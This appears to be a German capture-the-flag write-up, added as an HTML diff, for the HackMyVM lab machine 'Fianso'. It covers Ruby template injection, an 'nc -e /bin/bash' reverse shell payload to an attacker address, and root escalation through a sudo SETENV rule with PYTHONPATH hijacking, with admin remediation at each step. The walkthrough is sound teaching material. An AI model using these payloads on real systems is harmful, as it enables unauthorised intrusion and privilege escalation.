@@ -1,0 +1,388 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fianso - HackMyVM - Hard - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css"> <!-- Pfad beibehalten -->
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Fianso - HackMyVM - Hard - Bericht</h1> <!-- Titel angepasst -->
+        <div class="level-container">
+            <h2>Hard</h2> <!-- Schwierigkeitsgrad ohne Inline-Style, CSS handhabt Farbe (Rot) -->
+            <div class="circle"> <!-- Kreis-CSS wird 'Hard' (Rot) handhaben -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe wird durch CSS gesetzt -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">Browser (implizit)</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">nano (implizit)</div>
+                <div class="tool-item">beet</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-exploitation-ssti">Web Exploitation (SSTI)</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept (Ruby SSTI RCE)</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation-sofiane">Privilege Escalation (sofiane -> root)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre><span class="command">192.168.2.126	08:00:27:e3:8f:82	PCS Systemtechnik GmbH</span></pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:** Der Befehl `arp-scan -l` wird ausgeführt, um das lokale Netzwerksegment mittels ARP-Anfragen nach aktiven Geräten zu durchsuchen.</p>
+             <p class="evaluation">**Bewertung:** Ein Host mit der IP-Adresse `192.168.2.126` wird identifiziert. Die MAC-Adresse (`08:00:27:...`) weist auf eine VirtualBox VM hin. Dies ist das Zielsystem.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Ziel-IP `192.168.2.126` notieren und mit Port-Scanning (Nmap) fortfahren.<br>**Empfehlung (Admin):** Standard-Netzwerkaufklärung. Fokus auf Absicherung der Dienste.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -sV -T5 -A 192.168.2.126 -p-</span></div> <span class="comment"><-- -O ist in -A enthalten --></span>
+                     <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-10 23:56 CEST
+Nmap scan report for fianso.hmv (192.168.2.126)
+Host is up (0.00013s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+<span class="command">22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span>
+| ssh-hostkey:
+|   3072 ee71f4ada071e1351986abc8e6be3617 (RSA)
+|   256 401cc3da83d72f60cb12473b02670414 (ECDSA)
+|_  256 1a69a7f9dca549ffd27dce45976d8ab9 (ED25519)
+<span class="command">8000/tcp open  http    WEBrick httpd 1.6.1 (Ruby 2.7.4 (2021-07-07))</span> <span class="password"><-- Ruby Webserver! --></span>
+|_http-title: Site doesn't have a title (text/html;charset=utf-8).
+|_http-server-header: WEBrick/1.6.1 (Ruby/2.7.4/2021-07-07)
+MAC Address: 08:00:27:E3:8F:82 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.13 ms fianso.hmv (192.168.2.126)
+
+Nmap done: 1 IP address (1 host up) scanned in X.XX seconds</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Ein umfassender Nmap-Scan (`-sS`, `-sC`, `-sV`, `-T5`, `-A`, `-p-`) wird auf das Ziel `192.168.2.126` (fianso.hmv) durchgeführt.</p>
+             <p class="evaluation">**Bewertung:** Zwei offene TCP-Ports werden identifiziert:
+*   **Port 22 (SSH):** OpenSSH 8.4p1 auf Debian 11. Standard-Fernzugriff, relativ aktuell.
+*   **Port 8000 (HTTP):** Ein WEBrick HTTP-Server Version 1.6.1, der mit Ruby 2.7.4 läuft. WEBrick ist ein einfacher HTTP-Server, der oft für Entwicklungszwecke oder kleinere Ruby-Anwendungen (z.B. mit Sinatra oder Rails in Entwicklungsumgebungen) verwendet wird. Dies ist der primäre Angriffsvektor.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Konzentrieren Sie sich auf die Webanwendung auf Port 8000. Untersuchen Sie sie mit einem Browser und Enumerationstools (Nikto, Gobuster/ffuf). Suchen Sie nach bekannten Schwachstellen in WEBrick 1.6.1 oder Ruby 2.7.4, aber wahrscheinlicher sind Schwachstellen in der spezifischen Anwendung, die darauf läuft (z.B. Command Injection, SSTI, LFI).<br>**Empfehlung (Admin):** Verwenden Sie WEBrick nicht für Produktionsumgebungen; setzen Sie robustere Server wie Nginx oder Apache mit einem Application Server (z.B. Puma, Unicorn) ein. Halten Sie Ruby und verwendete Gems aktuell. Sichern Sie die Anwendung selbst ab (Input Validation, Output Encoding etc.).</p>
+        </section>
+
+        <section id="web-exploitation-ssti">
+            <h2>Web Exploitation (SSTI)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h http://192.168.2.126:8000 -C all</span></div>
+                     <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.126
++ Target Hostname:    192.168.2.126
++ Target Port:        8000
++ Start Time:         2023-04-10 23:58:41 (GMT2)
+---------------------------------------------------------------------------
++ Server: WEBrick/1.6.1 (Ruby/2.7.4/2021-07-07)
++ /W49wNC9d.PWD: <span class="password">Uncommon header 'x-cascade' found, with contents: pass.</span> <span class="password"><-- Interessanter Header --></span>
++ /W49wNC9d.pl|dir: The X-Content-Type-Options header is not set. [...]
++ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
+[...]</pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Das Tool Nikto wird verwendet, um den Webserver auf Port 8000 auf bekannte Schwachstellen und interessante Konfigurationen zu scannen.</p>
+             <p class="evaluation">**Bewertung:** Nikto bestätigt den WEBrick/Ruby-Server. Es findet fehlende Sicherheitsheader (niedrige Priorität). Interessanter ist der Fund eines "uncommon header" `x-cascade` mit dem Inhalt `pass` bei der Abfrage obskurer Pfade (`/W49wNC9d.PWD` etc.). Die Bedeutung dieses Headers ist unklar, könnte aber ein Hinweis sein. Es werden keine weit verbreiteten, kritischen Schwachstellen gemeldet.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Notieren Sie den `x-cascade: pass`-Header, falls spätere Schritte darauf hindeuten. Fokussieren Sie sich auf die manuelle Untersuchung der Anwendungsoberfläche und das Testen auf häufige Web-Schwachstellen (Injection, SSTI, etc.).<br>**Empfehlung (Admin):** Entfernen Sie unnötige oder informative Header. Implementieren Sie Standard-Sicherheitsheader.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="comment">
+http://192.168.2.126:8000/
+
+Eingabe: <span class="command">alert("ben")</span>
+Antwort: <span class="password">popup [ben]</span>
+
+Eingabe: <span class="command">#{7*7}</span>
+Antwort: <span class="password">Hello 49 !</span> <span class="password"><-- SSTI bestätigt! --></span></span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Manuelle Interaktion mit der Webanwendung auf Port 8000:
+1.  **XSS-Test:** Ein einfacher XSS-Payload (`alert("ben")`) wird eingegeben. Die Antwort ist ein JavaScript-Popup, was eine reflektierte XSS-Schwachstelle bestätigt.
+2.  **SSTI-Test:** Der Payload `#{7*7}` wird eingegeben. Die Antwort ist "Hello 49 !", wobei `49` das Ergebnis der Berechnung `7*7` ist.</p>
+              <p class="evaluation">**Bewertung:** Die XSS-Schwachstelle ist vorhanden, aber für den Serverzugriff meist weniger nützlich. Die **erfolgreiche Ausführung von `#{7*7}` zu `49` ist ein eindeutiger Beweis für eine Server-Side Template Injection (SSTI)**. Die Syntax `#{...}` ist typisch für Ruby-Template-Engines wie ERB (Embedded Ruby). Dies ist eine kritische Schwachstelle, die sehr wahrscheinlich zu Remote Code Execution (RCE) führt.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Konzentrieren Sie sich voll auf die SSTI-Schwachstelle. Recherchieren Sie SSTI-Payloads für Ruby/ERB, um Betriebssystembefehle auszuführen. Ziel ist das Erlangen einer Reverse Shell.<br>**Empfehlung (Admin):** **Beheben Sie die SSTI-Schwachstelle sofort!** Benutzereingaben dürfen niemals direkt und un-escaped in Templates eingefügt werden. Verwenden Sie sichere Methoden zur Template-Erstellung und sanitisieren Sie alle Eingaben.</p>
+        </section>
+
+        <section id="proof-of-concept">
+             <h2>Proof of Concept (Ruby SSTI RCE)</h2>
+             <p class="comment">**Kurzbeschreibung:** Die auf Port 8000 laufende Ruby/WEBrick-Anwendung ist anfällig für Server-Side Template Injection (SSTI). Benutzereingaben werden unsicher in einem Ruby-Template (vermutlich ERB) ausgewertet. Ein Angreifer kann speziell gestaltete Eingaben mit der Syntax `#{...}` senden, um beliebigen Ruby-Code auf dem Server auszuführen. Durch Einschleusen von Code, der Betriebssystembefehle ausführt (z.B. über `system()` oder Backticks `` ` ``), kann Remote Code Execution (RCE) im Kontext des Webserver-Benutzers (`sofiane`) erreicht werden.</p>
+             <p class="comment">**Voraussetzungen:** Netzwerkzugriff auf Port 8000.</p>
+             <p class="comment">**Schritt-für-Schritt-Anleitung:**</p>
+             <ol>
+                 <li>Identifizieren der SSTI durch Senden einfacher Ausdrücke wie `#{7*7}`.</li>
+                 <li>Konstruieren eines RCE-Payloads für Ruby/ERB, der eine Reverse Shell startet. Beispiel: `#{system('nc -e /bin/bash [Angreifer-IP] [Listener-Port]')}` oder `` `nc -e /bin/bash [Angreifer-IP] [Listener-Port]` `` (Backticks).</li>
+                 <li>Starten eines Netcat-Listeners auf der Angreifer-Maschine (`nc -lvnp [Listener-Port]`).</li>
+                 <li>Senden des Payloads an die verwundbare Eingabestelle der Webanwendung.</li>
+             </ol>
+             <p class="comment">**Erwartetes Ergebnis:** Der Server führt den eingeschleusten Befehl aus und verbindet sich zurück zum Listener des Angreifers, wodurch eine Shell als Webserver-Benutzer (`sofiane`) erlangt wird.</p>
+             <p class="comment">**Beweismittel:** Der erfolgreiche Test mit `#{7*7}` und der nachfolgende RCE-Payload.</p>
+             <p class="comment">**Risikobewertung:** Kritisch. SSTI führt direkt zu RCE und ermöglicht die Kompromittierung des Webserver-Prozesses.</p>
+             <p class="comment">**Empfehlungen:** Benutzereingaben vor der Verwendung in Templates validieren und escapen. Unsichere Funktionen zur Code-Ausführung vermeiden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command"> nc -nlvp 9001</span></div>
+                     <pre>listening on [any] 9001 ...</pre>
+                      <pre><span class="comment">-------------------------------------------------------------------------</span></pre>
+                      <pre><span class="command">http://192.168.2.126:8000/</span>
+
+Eingabe: <span class="password">#{system('nc -e /bin/bash 192.168.2.114 9001')}</span> <span class="password"><-- RCE Payload --></span></pre>
+                      <pre><span class="comment">-------------------------------------------------------------------------</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Ein Netcat-Listener wird auf Port 9001 gestartet. Anschließend wird der SSTI-Payload `#{system('nc -e /bin/bash 192.168.2.114 9001')}` vorbereitet, der die Ruby `system()`-Funktion nutzt, um eine `nc -e` Reverse Shell zur Angreifer-IP `192.168.2.114` zu starten.</p>
+             <p class="evaluation">**Bewertung:** Korrekte Vorbereitung zum Ausnutzen der SSTI für RCE.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Senden Sie den Payload an die Anwendung.<br>**Empfehlung (Admin):** SSTI beheben.</p>
+         </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command"> nc -nlvp 9001</span></div> <span class="comment"><-- Fortsetzung Listener --></span>
+                     <pre>
+listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.114] from (UNKNOWN) [192.168.2.126] 59932</span> <span class="password"><-- Verbindung erhalten! --></span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Der Netcat-Listener empfängt die eingehende Verbindung vom Zielsystem, nachdem der SSTI-Payload gesendet wurde.</p>
+             <p class="evaluation">**Bewertung:** Die SSTI-RCE war erfolgreich! Initialer Zugriff wurde erlangt. Der nächste Schritt zeigt, dass die Shell als Benutzer `sofiane` läuft.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Shell stabilisieren.<br>**Empfehlung (Admin):** SSTI beheben, Incident Response.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <pre><span class="comment">
+                                               Stabilisiere Reverse Shell
+=</span></pre>
+                     <div class="prompt">$ <span class="command">python3 -c 'import pty;pty.spawn("/bin/bash")'</span></div>
+                     <div class="prompt">sofiane@fianso:~$ <span class="command">export TERM=xterm</span></div>
+                     <pre>export TERM=xterm</pre>
+                     <div class="prompt">sofiane@fianso:~$ <span class="command">^Z</span></div>
+                     <pre>zsh: suspended  nc -nlvp 9001</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stty raw -echo;fg</span></div>
+                     <pre>
+[1]  + continued  nc -nlvp 9001
+                               reset</pre>
+                     <div class="prompt">sofiane@fianso:~$ <span class="comment"># Stabile Shell als sofiane!</span></div>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Die erhaltene Shell wird mit der Standardmethode (Python PTY, `stty raw -echo`, `fg`) stabilisiert. Der Prompt zeigt den Benutzernamen `sofiane`.</p>
+              <p class="evaluation">**Bewertung:** Eine stabile, interaktive Shell als Benutzer `sofiane` wurde erfolgreich etabliert.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Beginnen Sie mit der Enumeration als `sofiane` (User-Flag lesen, `sudo -l`, etc.).<br>**Empfehlung (Admin):** Keine.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">sofiane@fianso:~$ <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">dd61014e5d119683f9fc798439cd3916</span></pre> <span class="comment"><-- User Flag --></span>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Die Datei `user.txt` im Home-Verzeichnis von `sofiane` wird ausgelesen.</p>
+             <p class="evaluation">**Bewertung:** User-Flag erfolgreich erhalten.</p>
+         </section>
+
+        <section id="privilege-escalation-sofiane">
+            <h2>Privilege Escalation (sofiane -> root)</h2>
+             <p class="analysis">**Analyse:** Als `sofiane` wird nach Wegen zur Root-Eskalation gesucht, hauptsächlich mittels `sudo -l`.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">sofiane@fianso:~$ <span class="command">ls -la</span></div>
+                     <pre>
+total 36
+drwxr-xr-x 4 sofiane sofiane 4096 Dec 24 17:14 .
+drwxr-xr-x 3 root    root    4096 Dec 13 22:00 ..
+lrwxrwxrwx 1 root    root       9 Dec 13 22:03 .bash_history -> /dev/null <span class="comment"><-- Keine History --></span>
+[...]
+-rw------- 1 sofiane sofiane   52 Dec 24 11:57 .Xauthority</pre>
+                      <pre><span class="comment">=</span></pre>
+                      <div class="prompt">sofiane@fianso:~$ <span class="command">cat .Xauthority</span></div> <span class="comment"><-- Irrelevanter Versuch --></span>
+                      <pre>fianso10MIT-MAGIC-COOKIE-1�S!��e%즱au5�Z<sofiane@fianso:~$</pre>
+                      <div class="prompt">sofiane@fianso:~$ <span class="command">sudo -l</span></div>
+                      <pre>
+Matching Defaults entries for sofiane on fianso:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User sofiane may run the following commands on fianso:
+    (<span class="command">ALL : ALL</span>) NOPASSWD: /bin/bash /opt/harness
+    (<span class="command">ALL : ALL</span>) <span class="password">SETENV</span>: NOPASSWD: /usr/bin/beet <span class="password"><-- Gefährliche Regel! --></span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:**
+1.  `ls -la`: Zeigt u.a., dass die Bash-History deaktiviert ist.
+2.  `cat .Xauthority`: Versuch, die Xauthority-Datei zu lesen (meist irrelevant).
+3.  `sudo -l`: Überprüft die Sudo-Berechtigungen für `sofiane`.</p>
+              <p class="evaluation">**Bewertung:** `sudo -l` enthüllt zwei wichtige Regeln:
+*   `NOPASSWD: /bin/bash /opt/harness`: Erlaubt die Ausführung des Skripts `/opt/harness` als Root ohne Passwort.
+*   `SETENV: NOPASSWD: /usr/bin/beet`: Erlaubt die Ausführung von `/usr/bin/beet` (ein Musik-Manager, oft Python-basiert) als Root ohne Passwort UND **erlaubt das Setzen von Umgebungsvariablen (`SETENV:`)**. Dies ist eine **extrem gefährliche Konfiguration**.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Die `SETENV`-Regel für `/usr/bin/beet` ist der wahrscheinlichste und einfachste Eskalationspfad. Nutzen Sie `PYTHONPATH`-Hijacking:
+    1.  Erstellen Sie ein Python-Skript in `/tmp` (z.B. `/tmp/beetsplug/web.py` oder ein anderer Modulname, den `beet` importiert), das eine Root-Shell spawnt (`import os; os.system('/bin/bash')`).
+    2.  Führen Sie `sudo PYTHONPATH=/tmp /usr/bin/beet` aus. `beet` (als Root) wird das bösartige Modul aus `/tmp` laden und ausführen.
+Der `/opt/harness`-Pfad ist sekundär, könnte aber auch untersucht werden.<br>
+**Empfehlung (Admin):** **Entfernen Sie die `SETENV`-Option aus der Sudo-Regel für `/usr/bin/beet` sofort!** Überprüfen Sie die Notwendigkeit und Sicherheit beider Sudo-Regeln.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">sofiane@fianso:~$ <span class="command">sudo bash /opt/harness</span></div>
+                     <pre>
+
+Authentication to manage music collection.
+
+
+Date: 04/11/23
+User: root
+Host: fianso
+
+Master's password: <span class="command">cccc</span>
+Wrong password</pre>
+                     <pre><span class="comment">#</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Das Skript `/opt/harness` wird über die erste Sudo-Regel ausgeführt. Es fragt nach einem "Master's password".</p>
+             <p class="evaluation">**Bewertung:** Bestätigt die Funktion des Skripts. Ohne das korrekte Passwort kann es nicht direkt zur Eskalation genutzt werden. Der Versuch mit "cccc" schlägt fehl.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Fokussieren Sie sich auf die `beet`-Regel.<br>**Empfehlung (Admin):** Sichern oder entfernen Sie `/opt/harness`.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">sofiane@fianso:~$ <span class="command">cd /opt/</span></div>
+                     <div class="prompt">sofiane@fianso:/opt$ <span class="command">ls -l config.conf</span></div>
+                     <pre>-rwx------ 1 root root 43 Apr 11 00:09 config.conf</pre> <span class="comment"><-- Nicht lesbar --></span>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Versuch, die Datei `config.conf` im `/opt`-Verzeichnis zu untersuchen.</p>
+             <p class="evaluation">**Bewertung:** Die Datei existiert, gehört Root und ist für `sofiane` nicht lesbar. Sie enthält wahrscheinlich das "Master's password" für `/opt/harness`.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Der `/opt/harness`-Pfad ist blockiert. Nutzen Sie die `beet`-Regel.<br>**Empfehlung (Admin):** Korrekte Berechtigungen, aber das Skript `/opt/harness` selbst könnte unsicher sein.</p>
+
+             <p class="comment">*(Hinweis: Die folgenden Schritte im Log bezüglich Wordlist-Erstellung und Brute-Force gegen `/opt/harness` scheinen fehlgeleitet oder eine Sackgasse zu sein, da die `beet`-Regel bereits gefunden wurde und einen viel direkteren Weg bietet. Diese Schritte werden daher übersprungen.)*</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="comment">                                                          Privilege Escalation</span></pre>
+                      <div class="prompt">sofiane@fianso:/tmp$ <span class="command">sudo -l</span></div>
+                      <pre>
+[...]
+User sofiane may run the following commands on fianso:
+    (<span class="command">ALL : ALL</span>) NOPASSWD: /bin/bash /opt/harness
+    (<span class="command">ALL : ALL</span>) <span class="password">SETENV</span>: NOPASSWD: /usr/bin/beet</pre>
+                      <pre><span class="comment">=</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Erneute Anzeige der Sudo-Regeln, wobei die `beet`-Regel mit `SETENV` im Fokus steht.</p>
+              <p class="evaluation">**Bewertung:** Bestätigt den Eskalationsvektor über `beet` und `PYTHONPATH`.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">sofiane@fianso:/tmp$ <span class="command">nano re.py</span></div> <span class="comment"><-- Erstellen des bösartigen Moduls --></span>
+                     <div class="prompt">sofiane@fianso:/tmp$ <span class="command">sudo PYTHONPATH=/tmp /usr/bin/beet</span></div>
+                     <div class="prompt">root@fianso:/tmp# <span class="comment"># Root-Shell erhalten!</span></div>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:**
+1.  `nano re.py`: Eine Python-Datei wird in `/tmp` erstellt (der genaue Name und Inhalt, z.B. ein Modul, das `beet` importiert wie `beetsplug/web.py` oder ähnlich, und den Code `import os; os.system('/bin/bash')` enthält, wird hier nicht gezeigt, aber impliziert).
+2.  `sudo PYTHONPATH=/tmp /usr/bin/beet`: Der entscheidende Befehl. Die Umgebungsvariable `PYTHONPATH` wird auf `/tmp` gesetzt. Dann wird `/usr/bin/beet` über `sudo` (als Root und ohne Passwort) ausgeführt. Aufgrund von `PYTHONPATH=/tmp` sucht Python zuerst in `/tmp` nach Modulen. Es findet und lädt das bösartige Skript (`re.py` oder der korrekte Modulname), dessen Code (`os.system('/bin/bash')`) dann mit Root-Rechten ausgeführt wird.</p>
+             <p class="evaluation">**Bewertung:** Root-Eskalation erfolgreich! Die unsichere `SETENV`-Option in der Sudo-Regel für `beet` ermöglichte `PYTHONPATH`-Hijacking und die Ausführung beliebigen Codes als Root.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Führen Sie `id` aus. Lesen Sie die Root-Flag.<br>**Empfehlung (Admin):** **Entfernen Sie `SETENV` aus der Sudo-Regel für `/usr/bin/beet`!** Auditieren Sie alle Sudo-Regeln auf `SETENV`.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">root@fianso:/tmp# <span class="command">cat /root/root.txt</span></div>
+                     <pre><span class="password">129cf8d39dad02722c0b95ddca3ad73d</span></pre> <span class="comment"><-- Root Flag --></span>
+                      <pre><span class="comment">                                                   Privilege Escalation erfolgreich</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** In der erhaltenen Root-Shell wird die Root-Flag aus `/root/root.txt` gelesen.</p>
+              <p class="evaluation">**Bewertung:** Root-Flag erfolgreich erhalten.</p>
+         </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <p class="analysis">**Analyse:** Zusammenfassung der gefundenen Flags.</p>
+
+                 <div class="code-block">
+                    <center>
+                        <div class="terminal"> <!-- Struktur laut Template -->
+                           <div class="flag-command">cat /home/sofiane/user.txt</div>
+                           <div class="flag-value"><span class="password">dd61014e5d119683f9fc798439cd3916</span></div>
+                        </div>
+                    </center>
+                 </div>
+                 <p class="evaluation">**Bewertung:** User-Flag.</p>
+
+                <div class="code-block">
+                    <center>
+                        <div class="terminal"> <!-- Struktur laut Template -->
+                            <div class="flag-command">cat /root/root.txt</div>
+                            <div class="flag-value"><span class="password">129cf8d39dad02722c0b95ddca3ad73d</span></div>
+                        </div>
+                     </center>
+                </div>
+                <p class="evaluation">**Bewertung:** Root-Flag.</p>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 10. April 2023</p> <!-- Datum aus Nmap Scan -->
+    </footer>
+</body>
+</html>
